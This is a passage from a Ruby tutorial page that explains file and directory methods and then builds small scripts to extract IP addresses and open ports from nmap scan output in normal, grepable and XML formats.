  <span class="no">Dir</span><span class="p">.</span><span class="nf">foreach</span><span class="p">(</span><span class="n">dir</span><span class="p">)</span> <span class="p">{</span> <span class="o">|</span><span class="n">x</span><span class="o">|</span> <span class="nb">puts</span> <span class="n">x</span> <span class="p">}</span>
<span class="k">end</span>
<span class="k">end</span>

<span class="k">if</span> <span class="o">!</span><span class="n">installed</span> <span class="k">then</span>
  <span class="nb">puts</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">" is not installed"</span>
<span class="k">end</span>

</code></pre></div></div>

<h2 id="files">Files</h2>

<ul>
  <li>This class allows programmers to work with files: open a file, get information about it, change its name, change its permission and much more.
 → http://ruby-doc.org/core-1.9.3/File.html</li>
</ul>

<p>Check if a file exists:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">exist?</span> <span class="s2">"empty_file.txt"</span>
<span class="c1"># Output: true</span>
</code></pre></div></div>

<p>Get the file size in bytes:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">size</span> <span class="s2">"teste.txt"</span>
<span class="c1"># Output: 2976</span>
</code></pre></div></div>

<p>Returns the size in bytes or nil if the file is empty:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="no">File</span><span class="p">.</span><span class="nf">size?</span> <span class="s2">"test.txt"</span>
 <span class="c1"># Output: nil</span>
</code></pre></div></div>

<p>Returns true if the file is empty:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">zero?</span>
<span class="c1"># Output: true</span>
</code></pre></div></div>

<p>Check if the argument is a file, directory or a symbolic link:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">file?</span> <span class="s2">"test.txt"</span>
<span class="c1"># Output: true</span>
<span class="no">File</span><span class="p">.</span><span class="nf">directory?</span> <span class="s2">"nested_dir"</span>
<span class="c1"># Output: true</span>
<span class="no">File</span><span class="p">.</span><span class="nf">symlink?</span> <span class="s2">"test_link"</span>
<span class="c1"># Output: true</span>
</code></pre></div></div>

<p>U can check the type directly with <strong>ftype</strong>:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">ftype</span> <span class="s2">"test.txt"</span>
 <span class="c1"># Output: "file"</span>
</code></pre></div></div>

<p>Methods <strong>readable?</strong>, <strong>writable?</strong> and <strong>executable?</strong> can be used to test permissions:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">readable?</span> <span class="s2">"test.txt"</span>
<span class="c1"># Output: true</span>
<span class="no">File</span><span class="p">.</span><span class="nf">writable?</span> <span class="s2">"test.txt"</span>
<span class="c1"># Output: true</span>
<span class="no">File</span><span class="p">.</span><span class="nf">executable?</span> <span class="s2">"test.txt"</span>
<span class="c1"># Output: false</span>
</code></pre></div></div>

<p><strong>mtime</strong> and <strong>atime</strong> returns respectively the last modification time and the last access time as a Time object:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">at</span><span class="o">=</span><span class="no">File</span><span class="p">.</span><span class="nf">atime</span> <span class="s2">"test.txt"</span>
<span class="c1"># Output: "2014-01-17 11:09:24 +0100"</span>
<span class="n">at</span><span class="p">.</span><span class="nf">getutc</span>
<span class="n">mt</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">mtime</span> <span class="s2">"test.txt"</span>
<span class="n">mt</span><span class="p">.</span><span class="nf">getutc</span>
</code></pre></div></div>

<p><strong>ctime</strong> can be used on Windows to retrieve the creation time:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">ctime</span> <span class="s2">"test.txt"</span>
</code></pre></div></div>

<p><strong>stat</strong> method returns a File::Stat object that encapsulates common status information about the file:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">st</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">stat</span> <span class="s2">"test.txt"</span>
<span class="n">st</span><span class="p">.</span><span class="nf">size</span>
<span class="c1"># Output: "3185"</span>
<span class="n">st</span><span class="p">.</span><span class="nf">atime</span>
<span class="c1"># Output: "2014-01-17 11:32:14 +0100"</span>
</code></pre></div></div>

<h3 id="working-with-names">Working with Names</h3>
<p><strong>basename</strong> method can be used to extract the file name form a path. If u specify the suffix argument then the suffix itself is removed from the result:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">basename</span> <span class="n">path</span>
<span class="c1"># Output: "test.txt"</span>
<span class="no">File</span><span class="p">.</span><span class="nf">basename</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">".txt"</span><span class="p">)</span>
<span class="c1"># Output: "test"</span>
</code></pre></div></div>

<p><strong>dirname</strong> method can be used to extract only the directory part of a path string. This will cut the last part from the string (therefore it does not have the suffix arg):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">dirname</span> <span class="n">path</span>
 <span class="c1"># Output: "~/ruby/file_example"</span>
</code></pre></div></div>

<p><strong>extname</strong> method returns the extension of the file of the given path while split returns an array containing both dirname and basename:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">extname</span> <span class="n">path</span>
 <span class="c1"># Output: ".txt"</span>
<span class="no">File</span><span class="p">.</span><span class="nf">split</span> <span class="n">path</span>
<span class="c1"># Output: ["~/ruby/file_example", "test.txt"]</span>
</code></pre></div></div>

<p><strong>join</strong> method allows us to create string paths. With FILE::SEPARATOR u can create both relative and absolute paths:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s2">"~"</span><span class="p">,</span><span class="s2">"ruby"</span><span class="p">,</span><span class="s2">"file_example"</span><span class="p">)</span>
<span class="no">File</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s2">""</span><span class="p">,</span><span class="s2">"root"</span><span class="p">,</span><span class="s2">"ruby"</span><span class="p">,</span><span class="s2">"file_example"</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>expand_path</strong> method converts a relative path to an absolute path. It has two arguments, the second is optional and if its provided, its prepended as a directory to the first argument.</p>
<ul>
  <li>If the first agument contains a <strong>~</strong>, then the current user home directory is used; otherwise the current working directory is used as the prepended directory.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="s2">"nested_dir"</span><span class="p">)</span>
<span class="c1"># Output: "/root/ruby/file_example"</span>
<span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="s2">"~/Desktop"</span><span class="p">)</span>
<span class="c1"># Output: "/root/Desktop"</span>
<span class="no">File</span><span class="p">.</span><span class="nf">expand_path</span><span class="p">(</span><span class="s2">"Documents"</span><span class="p">,</span><span class="s2">"/root"</span><span class="p">)</span>
<span class="c1"># Output: "/root/Documents"</span>
</code></pre></div></div>

<p><strong>fnmatch</strong> method tests if a filename string matches a specified pattern. The pattern is not a regular expression but its the usual glob syntax (first argument):</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">fnmatch</span><span class="p">(</span><span class="s2">"*.txt"</span><span class="p">,</span><span class="s2">"test.txt"</span><span class="p">)</span>
<span class="c1"># Output: true</span>
<span class="no">File</span><span class="p">.</span><span class="nf">fnmatch</span><span class="p">(</span><span class="s2">"*.rb"</span><span class="p">,</span><span class="s2">"test.txt"</span><span class="p">)</span>
<span class="c1"># Output: false</span>
<span class="no">File</span><span class="p">.</span><span class="nf">fnmatch</span><span class="p">(</span><span class="s2">"*.rb"</span><span class="p">,</span><span class="s2">"example.rb"</span><span class="p">)</span>
<span class="c1"># Output: true</span>
<span class="no">File</span><span class="p">.</span><span class="nf">fnmatch</span><span class="p">(</span><span class="s2">"/*/*.rb"</span><span class="p">,</span><span class="s2">"/root/ex.rb"</span><span class="p">)</span>
<span class="c1"># Output: true</span>
</code></pre></div></div>

<h3 id="creation--deletion--renaming">Creation / Deletion / Renaming</h3>
<p><strong>open</strong> method with the write modifier <strong>w</strong> to create a file:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"a_file.txt"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">)</span>
</code></pre></div></div>

<blockquote>
  <p>u can also use <strong>new</strong> to create</p>
</blockquote>

<p><strong>rename</strong> allows u to rename a file or a directory:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">rename</span><span class="p">(</span><span class="s2">"a_file.txt"</span><span class="p">,</span><span class="s2">"new_file.txt"</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>delete</strong> and <strong>unlink</strong> are used to delete a file:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">delete</span> <span class="s2">"new_file.txt"</span>
</code></pre></div></div>

<p><strong>chmod</strong> to change the permissions of a file:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">chmod</span><span class="p">(</span><span class="mo">0666</span><span class="p">,</span> <span class="s2">"test.txt"</span><span class="p">)</span>
</code></pre></div></div>

<p>// the <strong>chown</strong> is used to change the owner and the group of a file</p>

<p>→ moreover files: http://ruby-doc.org/core-1.9.3/File.html</p>

<h2 id="file-stream">File Stream</h2>

<h3 id="reading-from-a-file">Reading From a file</h3>
<p>→ http://ruby-doc.org/core-1.9.3/IO.html</p>

<p>→ http://ruby-doc.org/core-1.9.3/File.html</p>

<p>If <strong>open</strong> is followed by a block, the file object is passed to the block and the stream is automatically closed at block termination:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"multi_line.txt"</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span>
  <span class="n">contents</span> <span class="o">=</span> <span class="n">file</span><span class="p">.</span><span class="nf">read</span>
  <span class="nb">puts</span> <span class="n">contents</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Output:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">first</span> <span class="n">line</span>
<span class="n">second</span> <span class="n">line</span>
<span class="n">third</span> <span class="n">line</span>
</code></pre></div></div>

<p><strong>read</strong> can be used without opening the file:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">content</span> <span class="o">=</span> <span class="no">FIle</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="s2">"multi_line.txt"</span><span class="p">)</span>
</code></pre></div></div>

<p>// the same output</p>

<p>The method <strong>readline</strong> is similar to read but it can be used to obtain an array containing the line of the file:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">File</span><span class="p">.</span><span class="nf">readlines</span><span class="p">(</span><span class="s2">"multi_line.txt"</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>each</strong> can also be used to read a file line by line:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">file</span> <span class="o">=</span> <span class="no">File</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"text.txt"</span><span class="p">,</span><span class="s2">"r"</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span><span class="mi">0</span>
<span class="n">file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
  <span class="nb">puts</span> <span class="s2">"n:</span><span class="si">#{</span><span class="n">count</span><span class="si">}</span><span class="s2"> </span><span class="si">#{</span><span class="n">line</span><span class="si">}</span><span class="s2">"</span>
  <span class="n">count</span><span class="o">+=</span><span class="mi">1</span>
<span class="k">end</span>
</code></pre></div></div>

<blockquote>
  <p>There are other methods to read only characters (<strong>readchar</strong>) and bytes (<strong>readbyte</strong>):</p>
</blockquote>

<h3 id="writing-to-a-file">Writing to a file</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">-</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span> <span class="n">only</span>
<span class="o">-</span> <span class="n">w</span><span class="o">+</span> <span class="o">=</span> <span class="n">read</span> <span class="ow">and</span> <span class="n">write</span>
<span class="o">-</span> <span class="n">a</span> <span class="o">=</span> <span class="n">append</span> 
<span class="o">-</span> <span class="n">a</span><span class="o">+</span> <span class="o">=</span> <span class="n">append</span> <span class="ow">and</span> <span class="n">read</span>

<span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"text.txt"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span>
  <span class="n">file</span><span class="p">.</span><span class="nf">puts</span> <span class="s2">"First line </span><span class="se">\n</span><span class="s2">"</span>
  <span class="c1"># or</span>
  <span class="no">File</span><span class="p">.</span><span class="nf">write</span> <span class="s2">"Second line"</span>
<span class="k">end</span>

</code></pre></div></div>

<h2 id="working-with-nmap-files">Working with NMAP files</h2>

<h3 id="ip-extraction">IP Extraction</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="no">PE</span> <span class="o">-</span><span class="n">sn</span> <span class="o">-</span><span class="n">n</span> 

<span class="o">-</span><span class="no">PE</span> <span class="o">=</span> <span class="no">ICMP</span> <span class="n">echo</span> <span class="n">request</span>
<span class="o">-</span><span class="n">sn</span> <span class="o">=</span> <span class="n">only</span> <span class="no">PING</span> <span class="no">Scan</span> <span class="p">(</span><span class="n">disable</span> <span class="n">port</span> <span class="nb">scan</span><span class="p">)</span>
<span class="o">-</span><span class="n">n</span> <span class="o">=</span> <span class="no">Never</span> <span class="k">do</span> <span class="no">DNS</span> <span class="n">resolution</span>
</code></pre></div></div>

<p>NMAP Types of outputs:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">oN</span> <span class="o">=</span> <span class="n">normal</span> <span class="n">output</span>
<span class="o">-</span><span class="n">oX</span> <span class="o">=</span> <span class="n">xml</span> <span class="nb">format</span>
<span class="o">-</span><span class="n">oG</span> <span class="o">=</span> <span class="n">greapable</span> <span class="nb">format</span>
<span class="o">-</span><span class="n">oA</span> <span class="o">=</span> <span class="n">create</span> <span class="mi">3</span> <span class="n">files</span> <span class="n">with</span> <span class="n">all</span> <span class="n">the</span> <span class="n">previous</span> <span class="n">formats</span>
</code></pre></div></div>

<p>We can grab the IP with regular expression :</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/^(?:Nmap scan report For )((?:\d{1,3}\.){3}\d{1,3})/</span>
</code></pre></div></div>

<ul>
  <li>(?:Nmap scan report For ) = identifies if the line starts with <strong>nmap scan report For</strong></li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="p">((</span><span class="sc">?:</span><span class="p">\</span><span class="n">d</span><span class="p">{</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">}\</span><span class="o">.</span><span class="p">){</span><span class="mi">3</span><span class="p">}\</span><span class="n">d</span><span class="p">{</span><span class="mi">1</span><span class="p">,</span><span class="mi">3</span><span class="p">})</span> <span class="o">=</span> <span class="n">matches</span> <span class="n">an</span> <span class="no">IP</span> <span class="n">address</span>
</code></pre></div></div>

<ul>
  <li>(?: ) syntax avoids capturing the subexpression inside parentheses. They are groups and they are used to capture more than one pattern inside a string.</li>
  <li>Therefore if we use (?: ), when we compare the entire pattern with a string, it does not capture the subexpression inside it.</li>
</ul>

<h3 id="example-1--grab-ip-from-nmap-normal-format">example 1 : Grab IP from NMAP normal format</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">begin</span>
  <span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s2">"r"</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span>
    <span class="n">file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
      <span class="sr">/^(?:Nmap scan report For )((?:\d{1,3}\.){3}\d{1,3})/</span> <span class="o">=~</span> <span class="n">line</span>
      <span class="nb">puts</span> <span class="vg">$1</span> <span class="k">if</span> <span class="vg">$1</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">rescue</span> <span class="no">StandardError</span> <span class="o">=&gt;</span> <span class="n">e</span>
  <span class="nb">puts</span> <span class="s2">"An error occurred: </span><span class="si">#{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>


</code></pre></div></div>

<h3 id="example-2--grab-ip-from-nmap-grepable-format">example 2 : Grab IP from NMAP Grepable format</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">begin</span>
  <span class="no">File</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="s2">"r"</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">file</span><span class="o">|</span>
    <span class="n">file</span><span class="p">.</span><span class="nf">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
      <span class="sr">/^(?:Host:)\s((?:\d{1,3}\.){3}\d{1,3})/</span> <span class="o">=~</span> <span class="n">line</span>
      <span class="nb">puts</span> <span class="vg">$1</span> <span class="k">if</span> <span class="vg">$1</span>
    <span class="k">end</span>
  <span class="k">end</span>
<span class="k">rescue</span> <span class="no">StandardError</span> <span class="o">=&gt;</span> <span class="n">e</span>
  <span class="nb">puts</span> <span class="s2">"An error occurred: </span><span class="si">#{</span><span class="n">e</span><span class="si">}</span><span class="s2">"</span>
<span class="k">end</span>

</code></pre></div></div>

<ul>
  <li>NMAP XML file</li>
  <li>its not a good idea to use regexp, its better to parse the data</li>
  <li>we want to extract the <strong>addr</strong> attribute of the address node</li>
</ul>

<p>→ https://www.w3schools.com/xml/xquery_intro.asp</p>

<p>→ https://www.w3schools.com/xml/xpath_intro.asp</p>

<ul>
  <li>
    <p>// if u want learn more about xml structures</p>
  </li>
  <li>
    <p>Ruby provides different libraries and gems to handle XML. One of them is REXML module.</p>
  </li>
</ul>

<p>→ http://www.germane-software.com/software/rexml/</p>

<p>→ http://ruby-doc.org/stdlib-1.9.3/libdoc/rexml/rdoc/REXML.html</p>

<p>We have to reach the address node of each host node. In xpath, we can achieve this using different strategies:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/nmaprun/</span><span class="n">host</span><span class="o">/</span><span class="n">address</span><span class="p">[</span><span class="vi">@addrtype</span><span class="o">=</span><span class="s1">'ipv4'</span><span class="p">]</span>
<span class="c1"># means that we start from the root node (vertex), then go down in the host node and finally we go down in the address node which contains the addrtype attribute equals to ipv4</span>

<span class="sr">//</span><span class="n">host</span><span class="o">/</span><span class="n">address</span><span class="p">[</span><span class="vi">@addrtype</span><span class="o">=</span><span class="s1">'ipv4'</span><span class="p">]</span>
<span class="c1"># means that there is not a starting point, rather all of the times we find a host node, we have to go down in an address node and check the addrtype.</span>

</code></pre></div></div>

<ul>
  <li>Since we will use <strong>REXML</strong>, one of the previous syntax must be inserted in one the method provided by REXML For data extraction.</li>
</ul>

<h3 id="example-3---grab-the-nmap-xml-output">example 3 - Grab the NMAP XML output:</h3>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s2">"rexml/document"</span>
<span class="k">begin</span>
  <span class="n">doc</span> <span class="o">=</span> <span class="no">REXML</span><span class="o">::</span><span class="no">Document</span><span class="p">.</span><span class="nf">new</span> <span class="no">File</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
  <span class="n">doc</span><span class="p">.</span><span class="nf">elements</span><span class="p">.</span><span class="nf">each</span><span class="p">(</span><span class="s2">"//host/address[@addrtype='ipv4']"</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">addr</span><span class="o">|</span>
    <span class="nb">puts</span> <span class="n">addr</span><span class="p">.</span><span class="nf">attributes</span><span class="p">[</span><span class="s2">"addr"</span><span class="p">]</span>
  <span class="k">end</span>
<span class="k">rescue</span> <span class="no">Exception</span> <span class="o">=&gt;</span> <span class="n">e</span>
  <span class="nb">puts</span> <span class="n">e</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="all-together">All Together</h3>

<ul>
  <li>add the shebang, it tells what  interpreter that executes the scripts code.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">which</span> <span class="n">ruby</span> <span class="o">=</span> <span class="sr">/usr/</span><span class="n">bin</span><span class="o">/</span><span class="n">ruby</span>
<span class="n">set</span> <span class="n">executions</span> <span class="n">permitions</span> <span class="n">with</span> <span class="n">chmod</span> <span class="o">+</span><span class="n">x</span> <span class="o">&lt;</span><span class="n">file</span><span class="p">.</span><span class="nf">rb</span><span class="o">&gt;</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/ruby</span>
<span class="c1"># this method contains the main script logic</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">opt</span><span class="p">,</span><span class="n">file</span><span class="p">)</span>
  <span class="k">case</span> <span class="n">opt</span>
    <span class="k">when</span> <span class="kp">nil</span> <span class="k">then</span> <span class="n">usage</span>
    <span class="k">when</span> <span class="s2">"-oN"</span> <span class="k">then</span> <span class="n">normal</span> <span class="n">file</span>
	<span class="k">when</span> <span class="s2">"-oG"</span> <span class="k">then</span> <span class="n">grepable</span> <span class="n">file</span>
	<span class="k">when</span> <span class="s2">"-oX"</span> <span class="k">then</span> <span class="n">xml</span> <span class="n">file</span>
	<span class="k">else</span> <span class="n">detect</span> <span class="n">opt</span>
  <span class="k">end</span>
<span class="k">end</span>

</code></pre></div></div>
<ul>
  <li>if we want to execute the script from any directory, we need to add the directory of the script to the root user PATH environment variable</li>
  <li>we have to change the <strong>PATH</strong> variable in the .bashrc file contained in the root user home dir</li>
</ul>

<p>Add the line:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">export</span> <span class="no">PATH</span><span class="o">=</span><span class="sr">/&lt;path of the script&gt;:$PATH
</span></code></pre></div></div>

<ul>
  <li>the normal - grepable - xml methods, contain the same code of the specific format scripts that we did earlier.</li>
  <li>lets see the method <strong>detect</strong></li>
</ul>

<p>If no option is provided the script detects if a standard nmap output file is provided:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="p">.</span><span class="nf">nmap</span> <span class="o">|</span> <span class="p">.</span><span class="nf">xml</span> <span class="o">|</span> <span class="p">.</span><span class="nf">gnmap</span>

<span class="k">def</span> <span class="nf">detect</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
  <span class="n">extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s2">".nmap"</span><span class="p">,</span><span class="s2">".xml"</span><span class="p">,</span><span class="s2">".gnmap"</span><span class="p">]</span>
  <span class="n">opt</span> <span class="o">=</span> <span class="p">[</span><span class="s2">"-oN"</span><span class="p">,</span><span class="s2">"-oX"</span><span class="p">,</span><span class="s2">"-oG"</span><span class="p">]</span>
  <span class="n">i</span> <span class="o">=</span> <span class="n">extensions</span><span class="p">.</span><span class="nf">index</span><span class="p">(</span><span class="no">File</span><span class="p">.</span><span class="nf">extname</span> <span class="n">file</span><span class="p">)</span>
  <span class="c1"># if the file has a valid standard extension we retry</span>
  <span class="c1"># the main method with the correct option</span>
  <span class="p">(</span><span class="n">main</span><span class="p">(</span><span class="n">opt</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">file</span><span class="p">);</span><span class="k">return</span><span class="p">)</span> <span class="k">if</span> <span class="n">i</span>
  <span class="c1">#otherwise an exception occurs</span>
  <span class="k">raise</span> <span class="no">Exception</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="s2">"Supported extensions: "</span><span class="o">+</span><span class="n">extensions</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="s2">" | "</span><span class="p">))</span>
<span class="k">end</span>

</code></pre></div></div>

<h2 id="open-ports-extraction">Open Ports Extraction</h2>

<p>We will see how to extract IP addresses and ports from the command:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span>
<span class="c1"># -sS = TCP SYN request</span>
<span class="c1"># -n = never do DNS resolution</span>
</code></pre></div></div>

<p>The arguments that the script should handle are the following:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pextr</span><span class="o">-</span><span class="n">n</span><span class="p">.</span><span class="nf">rb</span> <span class="n">ip</span> <span class="p">[</span><span class="o">-</span><span class="n">closed</span> <span class="o">|</span> <span class="o">-</span><span class="n">filtered</span> <span class="o">|</span> <span class="o">-</span><span class="nb">open</span><span class="p">]</span> <span class="n">file</span>
</code></pre></div></div>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="c1">#!/usr/bin/ruby</span>

<span class="k">begin</span>
  <span class="c1"># escape all the dots ( . ) -&gt; ip is used in </span>
  <span class="c1"># ip_pattern regular expression</span>
  <span class="n">ip</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">gsub</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span><span class="s2">"</span><span class="se">\\</span><span class="s2">."</span><span class="p">)</span>
  
  <span class="c1"># check if the optional argment 'state' is provided</span>
  <span class="n">options</span><span class="o">=</span><span class="p">[</span><span class="s2">"-open"</span><span class="p">,</span><span class="s2">"-closed"</span><span class="p">,</span><span class="s2">"-filtered"</span><span class="p">]</span>
  <span class="c1"># [1..-1] deletes the first minus character from ARGV[1]</span>
  <span class="n">port_state</span><span class="o">=</span><span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="o">..-</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="n">options</span><span class="p">.</span><span class="nf">include?</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
  <span class="c1"># if port_state is nil - &gt; default state is 'open'</span>
  <span class="n">port_state</span> <span class="o">=</span> <span class="s2">"open"</span> <span class="k">if</span> <span class="o">!</span><span class="n">port_state</span>
  <span class="c1"># check if argument is the file</span>
  <span class="n">file</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="k">if</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="c1">#if the optional state holds</span>
  <span class="n">file</span> <span class="o">=</span> <span class="no">ARGV</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="o">!</span><span class="n">file</span> <span class="c1"># if no optional state</span>

</code></pre></div></div>

<ul>
  <li>first we have to find the section in the file that contains information of the IP provided</li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>then we have to extract all the ports that have the desired state (open</td>
          <td>close</td>
          <td>filtered)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<p>Ip and port_state created previously:</p>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ip_pattern</span><span class="o">=</span><span class="sr">/^Nmap scan report For </span><span class="si">#{</span><span class="n">ip</span><span class="si">}</span><span class="sr">$/</span>
<span class="n">up_host_pattern</span><span class="o">=</span><span class="sr">/^Host is up (?:.)*\n/</span>
<span class="n">port_pattern</span><span class="o">=</span><span class="sr">/^(?:(\d+)\/\w+\s+</span><span class="si">#{</span><span class="n">port_state</span><span class="si">}</span><span class="sr">\s+.+\n)/</span>
</code></pre></div></div>

<ul>
  <li>now we can read one line at time</li>
  <li>once we find the correct IP (ip_pattern matched), if the host is alive (up_host_pattern matched), we can extract every port that is open or closed or filtered, according to our need (port_pattern matched)</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
